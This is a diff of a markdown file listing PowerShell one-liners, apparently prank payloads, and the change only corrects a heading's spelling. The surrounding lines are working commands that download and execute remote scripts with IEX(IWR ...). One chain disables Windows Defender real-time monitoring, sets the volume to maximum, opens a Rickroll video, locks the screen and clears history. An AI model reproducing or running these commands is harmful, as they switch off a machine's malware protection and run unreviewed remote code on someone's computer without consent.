@@ -59,7 +59,7 @@ IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock
 ```
 IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 99
 ```
-### Working-Rickroll - (Set's Volmume, LocksScreen)
+### Working-Rickroll - (Set's Volume, Lock's Screen)
 ```
 Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -millisecond 1500; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/Set-Volume.ps1 -UseBasicParsing); Set-SoundVolume 100; start chrome https://www.youtube.com/watch?v=o-YBDTqX_ZU; IEX(IWR https://raw.githubusercontent.com/OPstriker/PS-Script-s/main/screen-lock-test.ps1 -UseBasicParsing); Lock-Screen -LockSeconds 60; Stop-Process -name "chrome"; Clear-History
 ```
